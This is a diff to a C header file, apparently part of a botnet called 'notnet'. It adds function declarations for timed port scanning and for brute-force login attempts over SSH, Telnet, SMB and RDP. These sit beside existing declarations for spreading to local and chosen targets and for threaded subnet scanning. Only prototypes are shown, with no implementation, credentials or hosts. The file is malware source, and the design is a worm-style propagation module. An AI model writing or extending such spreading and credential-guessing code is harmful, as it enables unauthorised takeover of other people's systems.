@@ -38,6 +38,11 @@ int spread_local(notnet_bot_t *bot);
 int spread_target(notnet_bot_t *bot, notnet_target_t *target);
 int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);
 int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port);
+int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms);
+int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
 char *scan_ports(const char *target, uint16_t *ports, int port_count);
 int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);
 
